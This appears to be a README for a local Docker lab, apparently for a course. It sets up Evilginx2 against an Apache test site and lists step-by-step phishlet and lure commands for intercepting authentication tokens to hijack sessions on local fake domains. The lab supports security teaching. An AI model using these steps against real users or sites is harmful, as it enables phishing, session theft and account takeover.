## Objective
Intercept the authentication tokens needed to hijack the user's session. 

## Build & run the containers
- **sudo apt update**
- Install Docker (Linux, Windows)
  **sudo apt install -y docker.io**
- Start docker (bij boot)
  **sudo systemctl enable docker --now**
- Download/clone this repo (wget, git, ...)
- Build/start Docker containers
  **sudo docker-compose up --build -d --force-recreate --remove-orphans**
- verify if docker containers are running
  **sudo docker ps**

You will now have two Docker Containers:
- Evilginx Lab (PXL-EVIL)
- Apache webserver (PXL)

## Edit locahost
- Add lines to hosts file:
  
	172.18.0.20 	pxl.local login.pxl.local
	172.18.0.10	  fake.local login.fake.local
  **sudo nano /etc/hosts**

The 'normal' Apache site should work at: https://login.pxl.local!

## Evilginx
- Connect to Evilginix container 
	**sudo docker exec -it /PXL-EVIL /bin/bash**
- Start Evilginx in developer mode (required for certificates)
  **./evilginx2 -developer**
                                        
## Config Evilginx
```bash  
: config domain fake.local
: config ipv4 172.18.0.10
: phishlets hostname pxl fake.local

: phishlets get-hosts pxl
	172.18.0.10 login.fake.local
	172.18.0.10 fake.local
	
: phishlets enable pxl
: lures create pxl
: lures
: lures get-url 0
```bash  

## Troubleshooting
- Start Evilginx with Debug: **./evilginx2 -developer -debug**
- Stop all containers: **docker stop $(docker ps -aq)**
- Remove all containers: **docker rm $(docker ps -aq)**
- Prune networks: **docker network prune**
